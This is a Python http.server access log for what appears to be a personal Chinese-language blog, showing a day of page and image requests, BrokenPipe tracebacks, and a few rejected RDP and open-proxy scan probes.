+36.232.39.182 - - [12/Apr/2024 11:29:08] "GET /resource/%E6%88%91%E7%9A%84%E6%95%88%E7%8E%87%E5%B7%A5%E5%85%B7/ HTTP/1.1" 200 -
+36.232.39.182 - - [12/Apr/2024 11:29:09] "GET /img/config-jianyue-Snipaste_2023-11-04_16-25-32.png HTTP/1.1" 200 -
+36.232.39.182 - - [12/Apr/2024 11:29:09] "GET /img/jianyue-Snipaste_2023-11-04_16-28-00.png HTTP/1.1" 200 -
+36.232.39.182 - - [12/Apr/2024 11:29:09] "GET /img/jianyue-Snipaste_2023-11-04_16-27-03.png HTTP/1.1" 200 -
+36.232.39.182 - - [12/Apr/2024 11:29:10] "GET /img/Snipaste_2023-11-04_16-43-34.png HTTP/1.1" 200 -
+36.232.39.182 - - [12/Apr/2024 11:29:10] "GET /img/Snipaste_2023-11-04_16-49-57.png HTTP/1.1" 200 -
+36.232.39.182 - - [12/Apr/2024 11:29:10] "GET /img/logseq-Snipaste_2023-11-04_16-38-10.png HTTP/1.1" 200 -
+36.232.39.182 - - [12/Apr/2024 11:29:10] "GET /img/Snipaste_2023-11-04_16-47-47.png HTTP/1.1" 200 -
+36.232.39.182 - - [12/Apr/2024 11:29:11] "GET /img/Snipaste_2023-11-04_16-59-36.png HTTP/1.1" 200 -
+36.232.39.182 - - [12/Apr/2024 11:29:11] "GET /img/Snipaste_2023-11-04_17-05-11.png HTTP/1.1" 200 -
+36.232.39.182 - - [12/Apr/2024 11:29:12] "GET /img/Snipaste_2023-11-04_17-06-35.png HTTP/1.1" 200 -
+----------------------------------------
+Exception occurred during processing of request from ('36.232.39.182', 19245)
+Traceback (most recent call last):
+  File "/usr/lib/python3.9/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.9/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.9/http/server.py", line 653, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.9/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/usr/lib/python3.9/http/server.py", line 427, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.9/http/server.py", line 415, in handle_one_request
+    method()
+  File "/usr/lib/python3.9/http/server.py", line 660, in do_GET
+    self.copyfile(f, self.wfile)
+  File "/usr/lib/python3.9/http/server.py", line 859, in copyfile
+    shutil.copyfileobj(source, outputfile)
+  File "/usr/lib/python3.9/shutil.py", line 208, in copyfileobj
+    fdst_write(buf)
+  File "/usr/lib/python3.9/socketserver.py", line 799, in write
+    self._sock.sendall(b)
+BrokenPipeError: [Errno 32] Broken pipe
+----------------------------------------
+36.232.39.182 - - [12/Apr/2024 11:29:14] "GET /resource/%E6%95%88%E7%8E%87%E5%B7%A5%E5%85%B7android/ HTTP/1.1" 200 -
+36.232.39.182 - - [12/Apr/2024 11:29:15] "GET /img/Snipaste_2023-11-20_12-59-20.png HTTP/1.1" 200 -
+36.232.39.182 - - [12/Apr/2024 11:31:07] "GET /resource/windows%E8%BD%AF%E4%BB%B6%E7%AE%A1%E7%90%86/ HTTP/1.1" 304 -
+36.232.39.182 - - [12/Apr/2024 11:31:13] "GET /img/jianyue-Snipaste_2023-11-04_16-28-00.png HTTP/1.1" 200 -
+36.232.39.182 - - [12/Apr/2024 11:31:13] "GET /img/logseq-Snipaste_2023-11-04_16-38-10.png HTTP/1.1" 200 -
+36.232.39.182 - - [12/Apr/2024 11:31:13] "GET /img/Snipaste_2023-11-04_16-49-57.png HTTP/1.1" 200 -
+36.232.39.182 - - [12/Apr/2024 11:31:13] "GET /img/Snipaste_2023-11-04_16-43-34.png HTTP/1.1" 200 -
+36.232.39.182 - - [12/Apr/2024 11:31:13] "GET /img/Snipaste_2023-11-04_17-06-35.png HTTP/1.1" 200 -
+36.232.39.182 - - [12/Apr/2024 11:31:13] "GET /img/Snipaste_2023-11-04_16-59-36.png HTTP/1.1" 200 -
+36.232.39.182 - - [12/Apr/2024 11:35:10] "GET / HTTP/1.1" 200 -
+36.232.39.182 - - [12/Apr/2024 11:35:15] "GET /posts/ HTTP/1.1" 304 -
+36.232.39.182 - - [12/Apr/2024 11:35:22] "GET /resource/%E7%A6%8F%E6%A0%BC%E8%A1%8C%E4%B8%BA%E6%A8%A1%E5%9E%8B/ HTTP/1.1" 200 -
+36.232.39.182 - - [12/Apr/2024 11:35:23] "GET /img/1712492720_Bdgeohw2.jpg HTTP/1.1" 200 -
+36.232.39.182 - - [12/Apr/2024 11:35:24] "GET /img/202404072047.png HTTP/1.1" 200 -
+36.232.39.182 - - [12/Apr/2024 11:35:24] "GET /img/202404072048.png HTTP/1.1" 200 -
+36.232.39.182 - - [12/Apr/2024 11:36:31] "GET /resource/%E5%AD%A6%E4%B9%A0%E6%9C%AC%E8%B4%A8/ HTTP/1.1" 304 -
+152.89.198.254 - - [12/Apr/2024 11:37:15] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+152.89.198.254 - - [12/Apr/2024 11:37:15] "  /*à     Cookie: mstshash=Administr" 400 -
+185.161.248.141 - - [12/Apr/2024 12:07:47] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+185.161.248.141 - - [12/Apr/2024 12:07:47] "  /*à     Cookie: mstshash=Administr" 400 -
+117.50.153.197 - - [12/Apr/2024 13:00:36] "GET / HTTP/1.1" 200 -
+198.235.24.58 - - [12/Apr/2024 13:06:12] "GET / HTTP/1.1" 200 -
+87.120.84.131 - - [12/Apr/2024 13:24:38] code 501, message Unsupported method ('CONNECT')
+87.120.84.131 - - [12/Apr/2024 13:24:38] "CONNECT 185.65.245.140:7227 HTTP/1.1" 501 -
+152.89.198.254 - - [12/Apr/2024 13:58:15] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+152.89.198.254 - - [12/Apr/2024 13:58:15] "  /*à     Cookie: mstshash=Administr" 400 -
+36.232.39.182 - - [12/Apr/2024 14:29:35] "GET /project/ HTTP/1.1" 200 -
+36.232.39.182 - - [12/Apr/2024 14:29:36] "GET /css/font.css HTTP/1.1" 200 -
+36.232.39.182 - - [12/Apr/2024 14:29:36] "GET /css/smigle.css HTTP/1.1" 200 -
+36.232.39.182 - - [12/Apr/2024 14:29:36] "GET /css/reset.css HTTP/1.1" 200 -
+36.232.39.182 - - [12/Apr/2024 14:29:36] "GET /images/wxf.jpg HTTP/1.1" 200 -
+36.232.39.182 - - [12/Apr/2024 14:29:36] "GET /fonts/iosevka-bold.woff2 HTTP/1.1" 200 -
+36.232.39.182 - - [12/Apr/2024 14:29:36] "GET /fonts/iosevka-regular.woff2 HTTP/1.1" 200 -
+36.232.39.182 - - [12/Apr/2024 14:29:43] "GET /favicon-32x32.png HTTP/1.1" 200 -
+36.232.39.182 - - [12/Apr/2024 14:29:46] "GET /resource/%E5%AD%A6%E4%B9%A0%E6%9C%AC%E8%B4%A8/ HTTP/1.1" 200 -
+36.232.39.182 - - [12/Apr/2024 14:30:05] "GET /about/ HTTP/1.1" 200 -
+36.232.39.182 - - [12/Apr/2024 14:30:21] "GET /posts/ HTTP/1.1" 200 -
+36.232.39.182 - - [12/Apr/2024 14:31:42] "GET /posts/%E5%85%A8%E6%A0%88%E8%B5%84%E6%BA%90/ HTTP/1.1" 200 -
+36.232.39.182 - - [12/Apr/2024 14:31:47] "GET /posts/%E6%AD%A3%E5%88%99%E8%AF%AD%E6%B3%95/ HTTP/1.1" 200 -
+36.232.39.182 - - [12/Apr/2024 14:31:48] "GET /img/Snipaste_2024-03-29_14-35-32.png HTTP/1.1" 200 -
+36.232.39.182 - - [12/Apr/2024 14:31:53] "GET /posts/%E8%87%AA%E5%AE%9A%E4%B9%89%E6%94%B6%E7%BC%A9%E5%BC%95%E6%93%8Eyacy/ HTTP/1.1" 200 -
+36.232.39.182 - - [12/Apr/2024 14:31:53] "GET /img/Snipaste_2024-03-20_16-23-23.png HTTP/1.1" 200 -
+36.232.39.182 - - [12/Apr/2024 14:31:53] "GET /img/Snipaste_2024-03-20_16-25-10.png HTTP/1.1" 200 -
+36.232.39.182 - - [12/Apr/2024 14:31:53] "GET /img/Snipaste_2024-03-20_16-26-40.png HTTP/1.1" 200 -
+36.232.39.182 - - [12/Apr/2024 14:31:53] "GET /img/Snipaste_2024-03-20_16-29-08.png HTTP/1.1" 200 -
+36.232.39.182 - - [12/Apr/2024 14:31:53] "GET /img/Snipaste_2024-03-20_16-43-43.png HTTP/1.1" 200 -
+36.232.39.182 - - [12/Apr/2024 14:31:54] "GET /img/Snipaste_2024-03-20_16-44-11.png HTTP/1.1" 200 -
+36.232.39.182 - - [12/Apr/2024 14:31:54] "GET /img/Snipaste_2024-03-20_16-29-39.png HTTP/1.1" 200 -
+36.232.39.182 - - [12/Apr/2024 14:31:55] "GET /img/Snipaste_2024-03-20_16-44-48.png HTTP/1.1" 200 -
+----------------------------------------
+Exception occurred during processing of request from ('36.232.39.182', 2453)
+Traceback (most recent call last):
+  File "/usr/lib/python3.9/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.9/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.9/http/server.py", line 653, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.9/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/usr/lib/python3.9/http/server.py", line 427, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.9/http/server.py", line 415, in handle_one_request
+    method()
+  File "/usr/lib/python3.9/http/server.py", line 660, in do_GET
+    self.copyfile(f, self.wfile)
+  File "/usr/lib/python3.9/http/server.py", line 859, in copyfile
+    shutil.copyfileobj(source, outputfile)
+  File "/usr/lib/python3.9/shutil.py", line 208, in copyfileobj
+    fdst_write(buf)
+  File "/usr/lib/python3.9/socketserver.py", line 799, in write
+    self._sock.sendall(b)
+BrokenPipeError: [Errno 32] Broken pipe
+----------------------------------------
+----------------------------------------
+Exception occurred during processing of request from ('36.232.39.182', 10101)
+Traceback (most recent call last):
+  File "/usr/lib/python3.9/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.9/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.9/http/server.py", line 653, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.9/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/usr/lib/python3.9/http/server.py", line 427, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.9/http/server.py", line 415, in handle_one_request
+    method()
+  File "/usr/lib/python3.9/http/server.py", line 660, in do_GET
+    self.copyfile(f, self.wfile)
+  File "/usr/lib/python3.9/http/server.py", line 859, in copyfile
+    shutil.copyfileobj(source, outputfile)
+  File "/usr/lib/python3.9/shutil.py", line 208, in copyfileobj
+    fdst_write(buf)
+  File "/usr/lib/python3.9/socketserver.py", line 799, in write
+    self._sock.sendall(b)
+BrokenPipeError: [Errno 32] Broken pipe
+----------------------------------------
+----------------------------------------
+Exception occurred during processing of request from ('36.232.39.182', 12203)
+Traceback (most recent call last):
+  File "/usr/lib/python3.9/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.9/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.9/http/server.py", line 653, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.9/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/usr/lib/python3.9/http/server.py", line 427, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.9/http/server.py", line 415, in handle_one_request
+    method()
+  File "/usr/lib/python3.9/http/server.py", line 660, in do_GET
+    self.copyfile(f, self.wfile)
+  File "/usr/lib/python3.9/http/server.py", line 859, in copyfile
+    shutil.copyfileobj(source, outputfile)
+  File "/usr/lib/python3.9/shutil.py", line 208, in copyfileobj
+    fdst_write(buf)
+  File "/usr/lib/python3.9/socketserver.py", line 799, in write
+    self._sock.sendall(b)
+BrokenPipeError: [Errno 32] Broken pipe
+----------------------------------------
+36.232.39.182 - - [12/Apr/2024 14:32:02] "GET / HTTP/1.1" 200 -
+36.232.39.182 - - [12/Apr/2024 14:39:14] "GET /project/ HTTP/1.1" 200 -
+36.232.39.182 - - [12/Apr/2024 14:39:18] "GET /project/ HTTP/1.1" 304 -
+223.104.209.45 - - [12/Apr/2024 15:11:13] "GET /posts/ HTTP/1.1" 200 -
+223.104.209.45 - - [12/Apr/2024 15:11:13] "GET /project/ HTTP/1.1" 200 -
+223.104.209.45 - - [12/Apr/2024 15:11:17] code 404, message File not found
+223.104.209.45 - - [12/Apr/2024 15:11:17] "GET /resource/%E5%86%B2%E7%AA%81%E5%9B%BE.md/ HTTP/1.1" 404 -
+223.104.209.45 - - [12/Apr/2024 15:11:17] "GET /favicon.ico HTTP/1.1" 200 -
+36.232.39.182 - - [12/Apr/2024 15:11:22] "GET / HTTP/1.1" 200 -
+36.232.39.182 - - [12/Apr/2024 15:11:23] "GET /project/ HTTP/1.1" 200 -
+36.232.39.182 - - [12/Apr/2024 15:11:27] code 404, message File not found
+36.232.39.182 - - [12/Apr/2024 15:11:27] "GET /resource/%E5%86%B2%E7%AA%81%E5%9B%BE.md/ HTTP/1.1" 404 -
+36.232.39.182 - - [12/Apr/2024 15:11:29] "GET /favicon.ico HTTP/1.1" 200 -
+36.232.39.182 - - [12/Apr/2024 15:12:11] code 404, message File not found
+36.232.39.182 - - [12/Apr/2024 15:12:11] "GET /resource/%E5%86%B2%E7%AA%81%E5%9B%BE.md/ HTTP/1.1" 404 -
+36.232.39.182 - - [12/Apr/2024 15:12:18] code 404, message File not found
+36.232.39.182 - - [12/Apr/2024 15:12:18] "GET /resource/%E5%86%B2%E7%AA%81%E5%9B%BE.md/ HTTP/1.1" 404 -
+36.232.39.182 - - [12/Apr/2024 15:12:47] "GET /project/ HTTP/1.1" 200 -
+36.232.39.182 - - [12/Apr/2024 15:12:59] "GET /project/ HTTP/1.1" 304 -
+36.232.39.182 - - [12/Apr/2024 15:13:02] code 404, message File not found
+36.232.39.182 - - [12/Apr/2024 15:13:02] "GET /resource/%E5%86%B2%E7%AA%81%E5%9B%BE.md/ HTTP/1.1" 404 -
+36.232.39.182 - - [12/Apr/2024 15:13:53] code 404, message File not found
+36.232.39.182 - - [12/Apr/2024 15:13:53] "GET /resource/%E5%86%B2%E7%AA%81%E5%9B%BE.md/ HTTP/1.1" 404 -
+36.232.39.182 - - [12/Apr/2024 15:14:00] code 404, message File not found
+36.232.39.182 - - [12/Apr/2024 15:14:00] "GET /resource/%E5%86%B2%E7%AA%81%E5%9B%BE.md/ HTTP/1.1" 404 -
+36.232.39.182 - - [12/Apr/2024 15:14:25] "GET /project/ HTTP/1.1" 200 -
+36.232.39.182 - - [12/Apr/2024 15:14:27] "GET /resource/%E5%86%B2%E7%AA%81%E5%9B%BE/ HTTP/1.1" 200 -
+36.232.39.182 - - [12/Apr/2024 15:14:28] "GET /img/Snipaste_2024-04-12_14-52-15.png HTTP/1.1" 200 -
+36.232.39.182 - - [12/Apr/2024 15:14:28] "GET /img/Snipaste_2024-04-12_14-52-42.png HTTP/1.1" 200 -
+36.232.39.182 - - [12/Apr/2024 15:14:28] "GET /img/Snipaste_2024-04-12_14-53-03.png HTTP/1.1" 200 -
+36.232.39.182 - - [12/Apr/2024 15:14:28] "GET /img/Snipaste_2024-04-12_14-52-49.png HTTP/1.1" 200 -
+36.232.39.182 - - [12/Apr/2024 15:14:28] "GET /img/Snipaste_2024-04-12_14-53-12.png HTTP/1.1" 200 -
+36.232.39.182 - - [12/Apr/2024 15:14:28] "GET /img/Snipaste_2024-04-12_14-52-56.png HTTP/1.1" 200 -
+36.232.39.182 - - [12/Apr/2024 15:14:30] "GET /img/Snipaste_2024-04-12_14-53-21.png HTTP/1.1" 200 -
+36.232.39.182 - - [12/Apr/2024 15:14:34] "GET /img/997389096.jpg HTTP/1.1" 200 -
+36.232.39.182 - - [12/Apr/2024 15:14:38] "GET /img/Snipaste_2024-04-12_14-54-55.png HTTP/1.1" 200 -
+223.104.209.45 - - [12/Apr/2024 15:15:45] code 404, message File not found
+223.104.209.45 - - [12/Apr/2024 15:15:45] "GET /resource/%E5%86%B2%E7%AA%81%E5%9B%BE.md/ HTTP/1.1" 404 -
+223.104.209.45 - - [12/Apr/2024 15:15:47] code 404, message File not found
+223.104.209.45 - - [12/Apr/2024 15:15:47] "GET /resource/%E5%86%B2%E7%AA%81%E5%9B%BE.md/ HTTP/1.1" 404 -
+223.104.209.45 - - [12/Apr/2024 15:15:48] code 404, message File not found
+223.104.209.45 - - [12/Apr/2024 15:15:48] "GET /resource/%E5%86%B2%E7%AA%81%E5%9B%BE.md/ HTTP/1.1" 404 -
+223.104.209.45 - - [12/Apr/2024 15:16:02] "GET / HTTP/1.1" 200 -
+223.104.209.45 - - [12/Apr/2024 15:16:28] "GET / HTTP/1.1" 304 -
+223.104.209.45 - - [12/Apr/2024 15:16:31] "GET /project/ HTTP/1.1" 200 -
+223.104.209.45 - - [12/Apr/2024 15:16:34] "GET /resource/%E5%86%B2%E7%AA%81%E5%9B%BE/ HTTP/1.1" 200 -
+223.104.209.45 - - [12/Apr/2024 15:16:34] "GET /img/Snipaste_2024-04-12_14-52-15.png HTTP/1.1" 200 -
+223.104.209.45 - - [12/Apr/2024 15:16:34] "GET /img/Snipaste_2024-04-12_14-52-42.png HTTP/1.1" 200 -
+223.104.209.45 - - [12/Apr/2024 15:16:34] "GET /img/Snipaste_2024-04-12_14-53-12.png HTTP/1.1" 200 -
+223.104.209.45 - - [12/Apr/2024 15:16:34] "GET /img/Snipaste_2024-04-12_14-52-49.png HTTP/1.1" 200 -
+223.104.209.45 - - [12/Apr/2024 15:16:34] "GET /img/Snipaste_2024-04-12_14-54-55.png HTTP/1.1" 200 -
+223.104.209.45 - - [12/Apr/2024 15:16:34] "GET /img/Snipaste_2024-04-12_14-52-56.png HTTP/1.1" 200 -
+223.104.209.45 - - [12/Apr/2024 15:16:34] "GET /img/Snipaste_2024-04-12_14-53-21.png HTTP/1.1" 200 -
+223.104.209.45 - - [12/Apr/2024 15:16:34] "GET /img/Snipaste_2024-04-12_14-53-03.png HTTP/1.1" 200 -
+223.104.209.45 - - [12/Apr/2024 15:16:34] "GET /img/997389096.jpg HTTP/1.1" 200 -
+223.104.209.45 - - [12/Apr/2024 15:17:45] code 404, message File not found
+223.104.209.45 - - [12/Apr/2024 15:17:45] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 -
+223.104.209.45 - - [12/Apr/2024 15:17:45] "GET /favicon.ico HTTP/1.1" 200 -
+223.104.209.45 - - [12/Apr/2024 15:17:45] "GET /apple-touch-icon.png HTTP/1.1" 200 -
+223.104.209.45 - - [12/Apr/2024 15:17:45] "GET /resource/%E5%86%B2%E7%AA%81%E5%9B%BE/ HTTP/1.1" 200 -
+223.104.209.45 - - [12/Apr/2024 15:17:45] "GET /apple-touch-icon.png HTTP/1.1" 200 -
+223.104.209.45 - - [12/Apr/2024 15:17:45] "GET /favicon-16x16.png HTTP/1.1" 200 -
+223.104.209.45 - - [12/Apr/2024 15:17:45] "GET /favicon-32x32.png HTTP/1.1" 200 -
+----------------------------------------
+Exception occurred during processing of request from ('223.104.209.45', 23752)
+Traceback (most recent call last):
+  File "/usr/lib/python3.9/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.9/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.9/http/server.py", line 653, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.9/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/usr/lib/python3.9/http/server.py", line 427, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.9/http/server.py", line 415, in handle_one_request
+    method()
+  File "/usr/lib/python3.9/http/server.py", line 660, in do_GET
+    self.copyfile(f, self.wfile)
+  File "/usr/lib/python3.9/http/server.py", line 859, in copyfile
+    shutil.copyfileobj(source, outputfile)
+  File "/usr/lib/python3.9/shutil.py", line 208, in copyfileobj
+    fdst_write(buf)
+  File "/usr/lib/python3.9/socketserver.py", line 799, in write
+    self._sock.sendall(b)
+BrokenPipeError: [Errno 32] Broken pipe
+----------------------------------------
+223.104.209.45 - - [12/Apr/2024 15:18:04] "GET /resource/%E5%86%B2%E7%AA%81%E5%9B%BE/ HTTP/1.1" 200 -
+223.104.209.45 - - [12/Apr/2024 15:18:04] "GET /img/Snipaste_2024-04-12_14-52-15.png HTTP/1.1" 200 -
+223.104.209.45 - - [12/Apr/2024 15:18:04] "GET /img/Snipaste_2024-04-12_14-52-42.png HTTP/1.1" 200 -
+223.104.209.45 - - [12/Apr/2024 15:18:04] "GET /img/Snipaste_2024-04-12_14-52-49.png HTTP/1.1" 200 -
+223.104.209.45 - - [12/Apr/2024 15:18:04] "GET /img/Snipaste_2024-04-12_14-54-55.png HTTP/1.1" 200 -
+223.104.209.45 - - [12/Apr/2024 15:18:04] "GET /img/Snipaste_2024-04-12_14-53-12.png HTTP/1.1" 200 -
+223.104.209.45 - - [12/Apr/2024 15:18:04] "GET /img/Snipaste_2024-04-12_14-52-56.png HTTP/1.1" 200 -
+223.104.209.45 - - [12/Apr/2024 15:18:04] "GET /img/997389096.jpg HTTP/1.1" 200 -
+223.104.209.45 - - [12/Apr/2024 15:18:04] "GET /img/Snipaste_2024-04-12_14-53-21.png HTTP/1.1" 200 -
+223.104.209.45 - - [12/Apr/2024 15:18:05] "GET /img/Snipaste_2024-04-12_14-53-03.png HTTP/1.1" 200 -
+113.108.28.61 - - [12/Apr/2024 15:18:48] "GET /resource/%E5%86%B2%E7%AA%81%E5%9B%BE/ HTTP/1.0" 200 -
+----------------------------------------
+Exception occurred during processing of request from ('223.104.209.45', 23770)
+Traceback (most recent call last):
+  File "/usr/lib/python3.9/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.9/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.9/http/server.py", line 653, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.9/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/usr/lib/python3.9/http/server.py", line 427, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.9/http/server.py", line 415, in handle_one_request
+    method()
+  File "/usr/lib/python3.9/http/server.py", line 660, in do_GET
+    self.copyfile(f, self.wfile)
+  File "/usr/lib/python3.9/http/server.py", line 859, in copyfile
+    shutil.copyfileobj(source, outputfile)
+  File "/usr/lib/python3.9/shutil.py", line 208, in copyfileobj
+    fdst_write(buf)
+  File "/usr/lib/python3.9/socketserver.py", line 799, in write
+    self._sock.sendall(b)
+BrokenPipeError: [Errno 32] Broken pipe
+----------------------------------------
+223.104.209.45 - - [12/Apr/2024 15:19:30] "GET /resource/%E5%86%B2%E7%AA%81%E5%9B%BE/ HTTP/1.1" 304 -
+223.104.209.45 - - [12/Apr/2024 15:19:30] "GET /img/997389096.jpg HTTP/1.1" 200 -
+223.104.209.45 - - [12/Apr/2024 15:19:30] "GET /img/Snipaste_2024-04-12_14-52-15.png HTTP/1.1" 304 -
+223.104.209.45 - - [12/Apr/2024 15:19:30] "GET /img/Snipaste_2024-04-12_14-52-42.png HTTP/1.1" 304 -
+223.104.209.45 - - [12/Apr/2024 15:19:30] "GET /img/Snipaste_2024-04-12_14-52-49.png HTTP/1.1" 304 -
+223.104.209.45 - - [12/Apr/2024 15:19:30] "GET /img/Snipaste_2024-04-12_14-54-55.png HTTP/1.1" 304 -
+223.104.209.45 - - [12/Apr/2024 15:19:30] "GET /img/Snipaste_2024-04-12_14-52-56.png HTTP/1.1" 304 -
+223.104.209.45 - - [12/Apr/2024 15:19:30] "GET /img/Snipaste_2024-04-12_14-53-03.png HTTP/1.1" 304 -
+223.104.209.45 - - [12/Apr/2024 15:19:30] "GET /img/Snipaste_2024-04-12_14-53-12.png HTTP/1.1" 304 -
+223.104.209.45 - - [12/Apr/2024 15:19:30] "GET /img/Snipaste_2024-04-12_14-53-21.png HTTP/1.1" 304 -
